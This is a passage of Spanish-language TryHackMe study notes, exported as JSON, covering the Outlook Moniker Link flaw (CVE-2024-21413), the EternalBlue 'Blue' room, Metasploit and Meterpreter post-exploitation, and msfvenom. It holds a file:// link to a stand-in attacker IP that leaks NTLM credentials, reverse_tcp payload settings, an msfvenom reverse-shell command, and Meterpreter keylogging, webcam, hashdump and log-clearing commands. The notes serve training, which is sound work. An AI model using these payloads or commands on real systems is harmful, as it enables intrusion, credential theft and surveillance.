bypass del modo protegido de Outlook.\n\n```html\n<p><a href=\"file://IP_ATACANTE/test!exploit\">Click me</a></p>\n```\n\nComo atacantes podemos ofrecer este link para el ataque. La compartición no tiene por qué existir en el dispositivo remoto. La ejecución remota de comandos (RCE) es posible porque el Moniker Link usa el modelo de objetos componentes (COM)."
  },
  {
    "title": "0. Moniker Link (CVE-2024-21413)",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/7-exploitation-basics/1-moniker-link-cve-2024-21413/0-moniker-link-cve-2024-21413/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/7. Exploitation Basics/1. Moniker Link (CVE-2024-21413)/0. Moniker Link (CVE-2024-21413).md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 7. Exploitation Basics > 1. Moniker Link (CVE-2024-21413)",
    "content": "[[THM/0. Pre Career/2. Cyber Security 101/7. Exploitation Basics/1. Moniker Link (CVE-2024-21413)/1. Introduction]]\n[[2. Moniker Link (CVE-2024-21413)]]\n[[3. Exploitation]]\n[[4. Detection]]\n[[5. Remediation]]\n"
  },
  {
    "title": "1. Introduction",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/7-exploitation-basics/1-moniker-link-cve-2024-21413/1-introduction/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/7. Exploitation Basics/1. Moniker Link (CVE-2024-21413)/1. Introduction.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 7. Exploitation Basics > 1. Moniker Link (CVE-2024-21413)",
    "content": "El 13 de febrero de 2024, Microsoft Outlook anunció una vulnerabilidad de brecha de credenciales (Moniker Link). Esta bypasseaba las medidas de seguridad de Outlook al manejar un tipo de hiperlink llamado Moniker Link. Un atacante podía abusar de esto para obtener las credenciales NTLM una vez hecho click.\n\n| **CVSS**          | **Description**                                                                                                                                          |\n| ----------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------- |\n| Publish date      | February 13th, 2024                                                                                                                                      |\n| MS article        | [https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2024-21413](https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2024-21413) |\n| Impact            | Remote Code Execution & Credential Leak                                                                                                                  |\n| Severity          | Critical                                                                                                                                                 |\n| Attack Complexity | Low                                                                                                                                                      |\n| Scoring           | 9.8                                                                                                                                                      |\n\nLa vulnerabilidad afecta a:\n\n| **Release**                       | **Version**                                |\n| --------------------------------- | ------------------------------------------ |\n| Microsoft Office LTSC 2021        | affected from 19.0.0                       |\n| Microsoft 365 Apps for Enterprise | affected from 16.0.1                       |\n| Microsoft Office 2019             | affected from 16.0.1                       |\n| Microsoft Office 2016             | affected from 16.0.0 before 16.0.5435.1001 |\n\n-------------------\n<h2>Objetivos de Aprendizaje</h2>\n- Cómo funciona la vulnerabilidad.\n- Comprender el modo \"Vista Protegida\" de Outlook.\n- Usar la vulnerabilidad para filtrar credenciales de un cliente.\n- Medidas de detección y mitigación."
  },
  {
    "title": "2. Gain Access",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/7-exploitation-basics/5-blue/2-gain-access/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/7. Exploitation Basics/5. Blue/2. Gain Access.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 7. Exploitation Basics > 5. Blue",
    "content": "1. Find the exploitation code we will run against the machine. What is the full path of the code? (Ex: exploit/........)\n   ![[Pasted image 20250924152941.png]]\n2. Show options and set the one required value. What is the name of this value? (All caps for submission)\n   ![[Pasted image 20250924153208.png]]\n3. Usually it would be fine to run this exploit as is; however, for the sake of learning, you should do one more thing before exploiting the target. Enter the following command and press enter:\n   \n   `set payload windows/x64/shell/reverse_tcp`\n   ![[Pasted image 20250924154024.png]]\n"
  },
  {
    "title": "5. Find flags!",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/7-exploitation-basics/5-blue/5-find-flags/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/7. Exploitation Basics/5. Blue/5. Find flags!.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 7. Exploitation Basics > 5. Blue",
    "content": "![[Pasted image 20250924160902.png]]\n\n1. Flag1? _This flag can be found at the system root._ \n   ![[Pasted image 20250924160954.png]]\n\n2. Flag2? _This flag can be found at the location where passwords are stored within Windows._\n   ![[Pasted image 20250924161046.png]]\n\n  \n\n*Errata: Windows really doesn't like the location of this flag and can occasionally delete it. It may be necessary in some cases to terminate/restart the machine and rerun the exploit to find this flag. This relatively rare, however, it can happen. \n\n3. flag3? _This flag can be found in an excellent location to loot. After all, Administrators usually have pretty interesting things saved._\n   ![[Pasted image 20250924161247.png]]"
  },
  {
    "title": "4. Cracking",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/7-exploitation-basics/5-blue/4-cracking/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/7. Exploitation Basics/5. Blue/4. Cracking.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 7. Exploitation Basics > 5. Blue",
    "content": "1. Within our elevated meterpreter shell, run the command 'hashdump'. This will dump all of the passwords on the machine as long as we have the correct privileges to do so. What is the name of the non-default user? \n   ![[Pasted image 20250924160624.png]]\n   \n2. Copy this password hash to a file and research how to crack it. What is the cracked password?\n   ![[Pasted image 20250924160709.png]]"
  },
  {
    "title": "0. Blue",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/7-exploitation-basics/5-blue/0-blue/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/7. Exploitation Basics/5. Blue/0. Blue.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 7. Exploitation Basics > 5. Blue",
    "content": "[[1. Recon]]\n[[2. Gain Access]]\n[[3. Escalate]]\n[[4. Cracking]]\n[[5. Find flags!]]\n"
  },
  {
    "title": "1. Recon",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/7-exploitation-basics/5-blue/1-recon/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/7. Exploitation Basics/5. Blue/1. Recon.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 7. Exploitation Basics > 5. Blue",
    "content": "Escanea la máquina.\n\n![[Pasted image 20250924152127.png]]\n\n1. How many ports are open with a port number under 1000?\n   3\n   \n2. What is this machine vulnerable to? (Answer in the form of: ms??-???, ex: ms08-067)\n   ![[Pasted image 20250924152627.png]]\n"
  },
  {
    "title": "3. Escalate",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/7-exploitation-basics/5-blue/3-escalate/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/7. Exploitation Basics/5. Blue/3. Escalate.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 7. Exploitation Basics > 5. Blue",
    "content": "1. If you haven't already, background the previously gained shell (CTRL + Z). Research online how to convert a shell to meterpreter shell in metasploit. What is the name of the post module we will use? (Exact path, similar to the exploit we previously selected) \n   ![[Pasted image 20250924154252.png]]\n\n2. Select this (use MODULE_PATH). Show options, what option are we required to change?\n   ![[Pasted image 20250924154451.png]]\n\n3. Once the meterpreter shell conversion completes, select that session for use.\n   ![[Pasted image 20250924154707.png]]\n\n4. Verify that we have escalated to NT AUTHORITY\\SYSTEM. Run getsystem to confirm this. Feel free to open a dos shell via the command 'shell' and run 'whoami'. This should return that we are indeed system. Background this shell afterwards and select our meterpreter session for usage again. \n   ![[Pasted image 20250924154810.png]]\n\n5. List all of the processes running via the 'ps' command. Just because we are system doesn't mean our process is. Find a process towards the bottom of this list that is running at NT AUTHORITY\\SYSTEM and write down the process id (far left column).\n   ![[Pasted image 20250924160451.png]]\n\n6. Migrate to this process using the 'migrate PROCESS_ID' command where the process id is the one you just wrote down in the previous step. This may take several attempts, migrating processes is not very stable. If this fails, you may need to re-run the conversion process or reboot the machine and start once again. If this happens, try a different process next time\n   ![[Pasted image 20250924160536.png]]"
  },
  {
    "title": "1. Introduction to Meterpreter",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/7-exploitation-basics/4-metasploit-meterpreter/1-introduction-to-meterpreter/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/7. Exploitation Basics/4. Metasploit - Meterpreter/1. Introduction to Meterpreter.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 7. Exploitation Basics > 4. Metasploit - Meterpreter",
    "content": "Meterpreter es un payload de Metasploit que soporta el proceso de pentesting con varios componentes de valor. Meterpreter correrá en el sistema víctima y actuará como un agente en un \"command and control\".\n\n-------------------\n<h2>¿Cómo funciona Meterfreter</h2>\nMeterpreter se ejecuta en el sistema objetivo pero no está instalado allí. Corre en memoria (RAM) y no se escribe en el disco (con el objetivo de no ser detectado por los escaneos de antivirus). De esta manera es visto tan sólo como un proceso.\n\nMeterpreter también intenta evitar ser detectado por IPSs (Intrusion Prevention System) basados en red e IDSs (Intrusion Detection System) usando comunicación encriptada con el servidor. Si el sistema objetivo no desencripta y revisa este tráfico, estas soluciones no podrán detectar su actividad.\n\nAunque Meterpreter es reconocido por la mayoría de software de antivirus, esta funcionalidad presenta cierto sigilo. De hecho, como es un proceso tiene un PID, pero si miramos el nombre bajo ese PID en la máquina objetivo no veremos meterpreter por ningún lado, sino `spoolsv.exe`. Incluso si vamos más allá y comprobamos las DLLs (Dynamic-Link Libraries), no veremos ningún `meterpreter.dll`.\n\n>[!NOTE] Meterpreter establecerá un canal de comunicación encriptada (TLS) con el sistema atacante.\n\n"
  },
  {
    "title": "5. Post-Exploitation Challenge",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/7-exploitation-basics/4-metasploit-meterpreter/5-post-exploitation-challenge/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/7. Exploitation Basics/4. Metasploit - Meterpreter/5. Post-Exploitation Challenge.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 7. Exploitation Basics > 4. Metasploit - Meterpreter",
    "content": "Los comandos antes mencionados como `getsystem` y `hashdump` proporcionarán información relevante para la escalada de privilegios y el movimiento lateral.\n\nLa fase de post explotación tendrá vaios objetivos y Meterpreter tiene funciones que pueden asistirnos en todos ellos:\n\n- Recopilar información sobre el sistema.\n- Buscar archivos interesantes, credenciales, etc.\n- Escalar privilegios.\n- Movimiento lateral.\n\nUna vez que las herramientas extra hayan sido cargadas con el comando `load`, veremos opciones en el menú `help`.\n\nUsa ` exploit/windows/smb/psexec`\n\nUsuario: `ballen`\nContraseña: `Password1`\n\n--------------------------\n\n![[Pasted image 20250923094940.png]]\n\n1. What is the computer name?\n   ![[Pasted image 20250923095101.png]]\n   \n2. What is the target domain?\n   ![[Pasted image 20250923095255.png]]\n   \n3. What is the name of the share likely created by the user?\n   ![[Pasted image 20250923095439.png]]\n   \n4. What is the NTLM hash of the jchambers user?\n   ![[Pasted image 20250923095549.png]]\n   \n5. What is the cleartext password of the jchambers user?\n   ![[Pasted image 20250923095716.png]]\n   \n6. Where is the \"secrets.txt\"  file located? (Full path of the file)\n   ![[Pasted image 20250923100507.png]]\n   \n7. What is the Twitter password revealed in the \"secrets.txt\" file?\n   ![[Pasted image 20250923100535.png]]\n   \n8. Where is the \"realsecret.txt\" file located? (Full path of the file)\n   ![[Pasted image 20250923100828.png]]\n   \n9. What is the real secret? \n   \n   ![[Pasted image 20250923100804.png]]\n\n"
  },
  {
    "title": "2. Meterpreter Flavors",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/7-exploitation-basics/4-metasploit-meterpreter/2-meterpreter-flavors/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/7. Exploitation Basics/4. Metasploit - Meterpreter/2. Meterpreter Flavors.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 7. Exploitation Basics > 4. Metasploit - Meterpreter",
    "content": "Como ya hemos visto en lecciones anteriores, los payloads de metasploit pueden ser divididos en dos categorías, inline (o single) y staged.\n\nLos payloads staged son mandados al objetivo en dos pasos. La primera parte es instalada (el stager) que pide el resto del payload. Los payloads inline son mandados en un solo paso. Los payloads de Meterpreter se dividen en la misma clasificación. Meterpreter, sin embargo tiene diferentes payloads en concordancia al sistema objetivo, para verlos: `msfvenom --list payloads | grep meterpreter`.\n\nLa decisión de qué versión de Meterpreter usar estará basada en tres cosas principalmente:\n\n- El sistema operativo que usa el sistema objetivo.\n- Los componentes disponibles en el sistema objetivo.\n- El tipo de conexión que puedas establecer con el sistema objetivo.\n\nAlgunos exploits tienen un payload autoconfigurado, como `ms17_010_eternalblue`. También puedes listar todos los payloads disponibles usando `show payloads`."
  },
  {
    "title": "3. Meterpreter Commands",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/7-exploitation-basics/4-metasploit-meterpreter/3-meterpreter-commands/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/7. Exploitation Basics/4. Metasploit - Meterpreter/3. Meterpreter Commands.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 7. Exploitation Basics > 4. Metasploit - Meterpreter",
    "content": "Al usar `help` en una sesión de Meterpreter, se nos mostrarán los comandos disponibles. Cada versión de Meterpreter tendrá unos comandos u otros, por lo que ejecutar `help` siempre es una buena idea. Meterpreter tiene tres opciones:\n\n- Comandos.\n- Herramientas.\n- Scripting.\n\nSi usas `help`, verás que los comandos de Meterpreter están listados en diferentes categorías:\n\n- Core commands\n- File system commands\n- Networking commands\n- System commands\n- User interface commands\n- Webcam commands\n- Audio output commands\n- Elevate commands\n- Password database commands\n- Timestomp commands\n\n>[!NOTE] Esta lista fue sacada de `windows/x64/meterpreter/reverse_tcp` y puede variar con las diferentes versiones.\n\n----------------------\n<h2>Comandos de Meterpreter</h2>\nLos core commands serán útiles para navegar e interactuar con el sistema objetivo. Debajo, algunos de los más utilizados. Recuerda comprobar todos los comandos disponibles ejecutando el comando `help`una vez iniciada la sesión.\n\n<h5>Core commands</h5>\n- `background`: Pone la sesión actual en segundo plano.\n- `exit`: Termina la sesión de Meterpreter.\n- `guid`: Muestra el GUID (Global Unique Identifier).\n- `help`: Muestra el menú de ayuda.\n- `info`: Muestra información sobre un módulo Post.\n- `irb`: Abre una shell de Ruby interactiva en la sesión actual.\n- `load`: Carga una o más extensiones de Meterpreter.\n- `migrate`: Permite migrar Meterpreter a otro proceso.\n- `run`: Ejecuta el script de Meterpreter o el módulo Post.\n- `sessions`: Para cambiar rápidamente a otra sesión.\n\n<h5>File system commands</h5>\n- `cd`: Para cambiar el directorio.\n- `ls`: Para listar los archivos en el directorio actual.\n- `pwd`: Muestra el directorio actual.\n- `edit`: Permite editar un archivo.\n- `cat`: Muestra el contenido de un archivo por pantalla.\n- `rm`: Para borrar un archivo.\n- `search`: Para buscar archivos.\n- `upload`: Para subir un archivo.\n- `download`: Para descargar un archivo.\n\n<h5>Networking commands</h5>\n- `arp`: Muestra la caché del host ARP (Address Resolution Protocol).\n- `ifconfig`: Muestra las interfaces de red disponibles en el objetivo.\n- `netstat`: Muestra las conexiones de red.\n- `portfwd`: Redirige un puerto local a un servicio remoto.\n- `route`: Permite ver y modificar la tabla de ruta.\n\n<h5>System commands</h5>\n- `clearev`: Limpia los logs de evento.\n- `execute`: Ejecuta un comando.\n- `getpid`: Muestra el identificador de proceso actual.\n- `getuid`: Muestra el usuario como el cual Meterpreter está corriendo.\n- `kill`: Termina un proceso.\n- `pkill`: Termina un proceso por nombre.\n- `ps`: Lista los procesos activos.\n- `reboot`: Reinicia el ordenador remoto.\n- `shell`: Muestra una linea de comanos del sistema.\n- `shutdown`: Apaga el equipo remoto.\n- `sysinfo`: Recoge y muestra información sobre el sistema remoto.\n\n<h5>Other Commands</h5>\n- `idletime`: Devuelve el número de segundos que el usuario remoto ha estado ausente.\n- `keyscan_dump`: Muestra el keystroke buffer (area de memoria que guarda temporalmente las teclas presionadas).\n- `keyscan_start`: Empieza a capturar teclas presionadas.\n- `keyscan_stop`: Para de capturar teclas presionadas.\n- `screenshare`: Permite ver la pantalla del usuario remoto en tiempo real.\n- `screenshot`: Toma una captura de pantalla del usuario remoto.\n- `record_mic`: Graba sonido del micrófono por defecto durante X segundos.\n- `webcam_chat`: Comienza un chat de video.\n- `webcam_list`: Lista webcams.\n- `webcam_snap`: Toma una foto de la cámara especificada.\n- `webcam_stream`: Muestra un canal de video de la cámara especificada.\n- `getsystem`: Intenta elevar tus privilegios.\n- `hashdump`: Muestra el contenido de la base de datos SAM."
  },
  {
    "title": "0. Metasploit - Meterpreter",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/7-exploitation-basics/4-metasploit-meterpreter/0-metasploit-meterpreter/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/7. Exploitation Basics/4. Metasploit - Meterpreter/0. Metasploit - Meterpreter.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 7. Exploitation Basics > 4. Metasploit - Meterpreter",
    "content": "[[1. Introduction to Meterpreter]]\n[[2. Meterpreter Flavors]]\n[[3. Meterpreter Commands]]\n[[4. Post-Exploitation with Meterpreter]]\n[[5. Post-Exploitation Challenge]]"
  },
  {
    "title": "4. Post-Exploitation with Meterpreter",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/7-exploitation-basics/4-metasploit-meterpreter/4-post-exploitation-with-meterpreter/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/7. Exploitation Basics/4. Metasploit - Meterpreter/4. Post-Exploitation with Meterpreter.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 7. Exploitation Basics > 4. Metasploit - Meterpreter",
    "content": "Meterpreter te ofrece varios comandos útiles que facilitan la post explotación.\n\n--------------\n<h5>Help</h5>\nEste comando te da una lista de comandos disponibles en Meterpreter.\n\n<h5>Meterpreter Commands</h5>\nEl comando `getuid` muestra el usuario con el cual Meterpreter está corriendo. El comando `ps` listará todos los procesos. La lista de PID también te dará información necesaria para migrar el proceso.\n\n<h5>Migrate</h5>\nMigrar a otro proceso sirve para interactuar con el. Por ejemplo si ves un procesador de palabras (como notepad.exe o word.exe) puedes migrar hacia él para empezar a capturar las teclas que son presionadas con comandos como `key_start`, `key_stop` y `key_dump`.\n\nPara migrar hacia otro proceso tienes que escribir: `migrate <new_process_PID>`.\n\n>[!CAUTION] Puedes perder tus privilegios si migras desde un proceso con más privilegios.\n\n<h5>Hashdump</h5>\nListará el contenido de la base de datos SAM. Las contraseñas de SAM se guardan en formato NTLM.\n\n<h5>Search</h5>\nEl comando `search` es útil para localizar archivos.\n\n<h5>Shell</h5>\nLanzará una shell en el sistema objetivo, pulsar `CTRL + Z` te devolverá a la shell de Meterpreter."
  },
  {
    "title": "0. Metasploit - Exploitation",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/7-exploitation-basics/3-metasploit-exploitation/0-metasploit-exploitation/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/7. Exploitation Basics/3. Metasploit - Exploitation/0. Metasploit - Exploitation.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 7. Exploitation Basics > 3. Metasploit - Exploitation",
    "content": "[[THM/0. Pre Career/2. Cyber Security 101/7. Exploitation Basics/3. Metasploit - Exploitation/1. Introduction]]\n[[2. Scanning]]\n[[3. The Metasploit Database]]\n[[4. Vulnerability Scanning]]\n[[5. Exploitation]]\n[[6. Msfvenom]]\n"
  },
  {
    "title": "2. Scanning",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/7-exploitation-basics/3-metasploit-exploitation/2-scanning/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/7. Exploitation Basics/3. Metasploit - Exploitation/2. Scanning.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 7. Exploitation Basics > 3. Metasploit - Exploitation",
    "content": "<h2>Escaneo de Puertos</h2>\nMetasploit tiene un número de módulos para escanear puertos abiertos en el sistema objetivo y su red. Puedes listarlos usando el comando `search portscan`. Requerirá que configures unas cuantas opciones:\n\n- **CONCURRENCY:** Número de objetivos escaneados a la vez.\n- **PORTS:** Rango de puertos a escanear. No es lo mismo que Nmap, pues este escanea los 1000 puertos mas usados y este del 1 al 1000.\n- **RHOSTS:** Objetivo o red objetivo a escanear.\n- **THREADS:** Número de hilos que serán usados a la vez.\n\nPuedes ejecutar nmap directamente desde la consola de `msfconsole`.  En cuanto a la recopilación de información, si requieres de un escaneo rápido, quizás Metasploit no sea la opción más indicada (sí por algún módulo). \n\n---------------\n<h2>Identificación de servicios UDP</h2>\nEl módulo `scanner/discovery/udp_sweep` nos permite identificar rápidamente servicios corriendo sobre UDP. Este módulo no escaneará todos los posibles servicios UDP pero nos ofrece una alternativa rápida para identificar servicios como DNS o NetBIOS.\n\n-----------------\n<h2>Escaneos SMB</h2>\nMetasploit ofrece varios módulos auxiliares que nos permiten escanear servicios específicos. Especialmente útiles en un entorno empresarial serían `smb_enumshares` y `smb_version`. No obstante, debes dedicar un tiempo a investigar sobre los escáneres instalados en tu versión de Metasploit.\n\nAl realizar escaneo de servicios es importante no omitir servicios más exóticos"
  },
  {
    "title": "5. Exploitation",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/7-exploitation-basics/3-metasploit-exploitation/5-exploitation/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/7. Exploitation Basics/3. Metasploit - Exploitation/5. Exploitation.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 7. Exploitation Basics > 3. Metasploit - Exploitation",
    "content": "Como el propio nombre sugiere, metasploit es una herramienta de explotación. Los módulos de explotación son los más abundantes.  Puedes buscar estos usando el comando `search`, obtener información sobre ellos usando el comando `info` y ejecutar los exploits usando el comando `run` o `exploit`.\n\nLa mayoría de exploits, tendrán un payload predefinido. Puedes usar `show payloads` para listar otros comandos que poder utilizar con ese exploit.\n\n```sbash\nmsf6 exploit(windows/smb/ms17_010_eternalblue) > show payloads \n\nCompatible Payloads\n===================\n\n   #   Name                                        Rank    Check  Description\n   -   ----                                        ----    -----  -----------\n   0   generic/custom                              manual  No     Custom Payload\n   1   generic/shell_bind_tcp                      manual  No     Generic Command Shell, Bind TCP Inline\n   2   generic/shell_reverse_tcp                   manual  No     Generic Command Shell, Reverse TCP Inline\n   3   windows/x64/exec                            manual  No     Windows x64 Execute Command\n   4   windows/x64/loadlibrary                     manual  No     Windows x64 LoadLibrary Path\n   5   windows/x64/messagebox                      manual  No     Windows MessageBox x64\n   6   windows/x64/meterpreter/bind_ipv6_tcp       manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager\n   7   windows/x64/meterpreter/bind_ipv6_tcp_uuid  manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager with UUID Support\n   8   windows/x64/meterpreter/bind_named_pipe     manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Bind Named Pipe Stager\n   9   windows/x64/meterpreter/bind_tcp            manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Bind TCP Stager\n   10  windows/x64/meterpreter/bind_tcp_rc4 \n```\n\nUna vez hayas decidido el payload puedes usar el comando `set payload` para hacer tu elección.\n\n>[!NOTE] Elegir un payload que funcione puede suponer un proceso de prueba y error debido a restricciones de sistema operativo, entorno o firewalls, anti-virus, anti escritura, etc.\n\nUna vez que una sesión ha comenzado la puedes poner en segundo plano usando `Ctrl + Z` o pararla usando `Ctrl + C`.\n\n------------------\n<h2>Trabajar con sesiones</h2>\nEl comando `sessions` listará todas las sesiones activas. Soporta un número de opciones que nos ayudarán a manejarlas. Podemos interactuar con una sesión existente usando el comando `sessions -i` seguido del ID de la sesión."
  },
  {
    "title": "1. Introduction",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/7-exploitation-basics/3-metasploit-exploitation/1-introduction/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/7. Exploitation Basics/3. Metasploit - Exploitation/1. Introduction.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 7. Exploitation Basics > 3. Metasploit - Exploitation",
    "content": "En esta unidad aprenderemos a cómo usar Metasploit para el escaneo de vulnerabilidades y explotación. También veremos cómo la función de base de datos hace más fácil manejar el pentesting con un enfoque más amplio. Finalmente veremos la generación de payloads con `msfvenom` y cómo empezar una sesión de Meterpreter en la mayoría de plataformas.\n\n------------------\n<h2>Objetivos de Aprendizaje</h2>\n- Cómo escanear objetivos usando Metasploit.\n- Cómo usar la función de base de datos de Metasploit.\n- Cómo usar Metasploit para realizar un escaneo de vulnerabilidades.\n- Cómo usar Metasploit para explotar servicios vulnerables en objetivos.\n- Cómo puede ser usado `msfvenom` para crear payloads y obtener una sesión de meterpreter en el objetivo.\n\n>[!NOTE] Todas las preguntas relacionadas con el uso de diccionarios o de ataques de fuerza bruta serán usando el diccionario: `/usr/share/wordlists/MetasploitRoom/MetasploitWordlist.txt`.\n\nSi optas por usar tu propia máquina descarga el diccionario. Para continuar con esta unidad utiliza el comando `msfconsole`."
  },
  {
    "title": "3. The Metasploit Database",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/7-exploitation-basics/3-metasploit-exploitation/3-the-metasploit-database/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/7. Exploitation Basics/3. Metasploit - Exploitation/3. The Metasploit Database.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 7. Exploitation Basics > 3. Metasploit - Exploitation",
    "content": "Aunque no es necesario en TryHackMe, un escenario realista de pentesting probablemente tendrá varios objetivos.\n\nMetasploit tiene una función de base de datos para simplificar el manejo de proyectos y evitar posibles confusiones al configurar parámetros.\n\n>[!NOTE] Los siguientes pasos han sido seguidos en la AttackBox de TryHackMe así que sólo deberás hacer esto si has instalado Metasploit tú mismo o estás usando tu propia máquina.\n\nPrimero debes lanzar PostgreSQL con el comando `systemctl startpostgresql`. Después tendremos que iniciar la base de datos de Metasploit usando el comando `msfdb init`. Intentar usar ese comando como root puede devolver un error, por lo que podemos ejecutarlo con el usuario postgres: `sudo -u postgres msfdb init`. Para borrar una base de datos: `sudo -u postgres msfdb delete`.\n\nUna vez hecho esto puedes lanzar `msfcosole` y comprobar el estado de la base de datos usando el comando `db_status`. \n\nLa función de base de datos nos permitirá crear espacios de trabajo para aislar los diferentes proyectos. Puedes listar estos espacios usando el comando `workspace`. \n\nPuedes añadir o eliminar estos añadiendo `-a` o `-d`, respectivamente. Para cambiar de uno a otro simplemente usa `workspace` seguido del nombre deseado. Puedes usar el comando `workspace -h` para listar las opciones de argumentos disponibles para `workspace`. \n\nSi quieres hacer un escaneo de nmap, usa `db_nmap` para que los resultados queden guardados. Ahora puedes acceder a la información relevante sobre los hosts y los servicios con los comandos `hosts` y `services`. Añadiendo `-h` a estos comandos puedes ver las opciones que tienen.\n\nPuedes usar el comando `hosts -R` para añadir el valor al parámetro RHOSTS.\n\n-------------\n<h2>Ejemplo de Flujo de Trabajo</h2>\n1. Usaremos el módulo de escaneo de vulnerabilidades que puede encontrar las vulnerabilidades MS17-010: `use auxiliary/scanner/smb/smb_ms17_010`.\n2. Configuramos el parámetro RHOSTS usando `hosts -R`.\n3. Escribimos `show options` para ver si los valores se asignaron correctamente.\n4. Una vez que todo está en su sitio, lanzamos el exploit usando `run` o `exploit`.\n\nSi hay más de una dirección IP guardada en la base, todas serán usadas con el comando `hosts -R`.\n\nEn un caso típico de pentesting podríamos tener el siguiente escenario:\n\n- Encontramos hosts disponibles con el comando `db_nmap`.\n- Escaneamos estos para encontrar vulnerabilidades o puertos abiertos usando módulos.\n\nEl comando `service` usado con el parámetro `-S` (`services -S netbios`) te permite buscar servicios específicos en el entorno.\n\nTe interesa buscar en puertos que tengan alguno de los siguientes servicios:\n\n- HTTP\n- SQL\n- FTP\n- SMB\n- SSH\n- RDP\n"
  },
  {
    "title": "6. Msfvenom",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/7-exploitation-basics/3-metasploit-exploitation/6-msfvenom/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/7. Exploitation Basics/3. Metasploit - Exploitation/6. Msfvenom.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 7. Exploitation Basics > 3. Metasploit - Exploitation",
    "content": "Msfvenom reemplazó a Msfpayload y Msfencode y te permite generar payloads. Msfvenom te permite acceder a todos los payloads disponibles en el framework de Metasploit. Te permite crear payloads en diferentes formatos (PHP, exe, dll, elf, etc.) y para varios diferentes sistemas (Apple, Windows, Android, Linux, etc.).\n\n------------------------\n<h2>Formatos de salida</h2>\nPuedes generar un ejecutable para meterpreter o un archivo crudo, como python. El comando `msfvenom --list formats` puede ser usado para listar formatos de salida soportados.\n\n---------------------\n<h2>Encoders</h2>\nContrario a lo que algunos piensan, los encoders no tratan de sobrepasar antivirus instalados. Efectivamente codifican el payload, pero más al ojo humano que a una máquina. Una práctica más robusta para evitar antivirus sería usar técnicas modernas de ofuscación o inyectar código shell. Para encodear debemos usar el parámetro `-e`, por ejemplo:\n\n`msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.186.44 -f raw -e php/base64`\n\n- `-p`: Especifica el tipo de payload.\n- `-f`: Especifica el formato, en este caso `raw`, lo que significa que no contendrá headers ni formateo.\n- `-e`: Especifica que el payload deberá ser 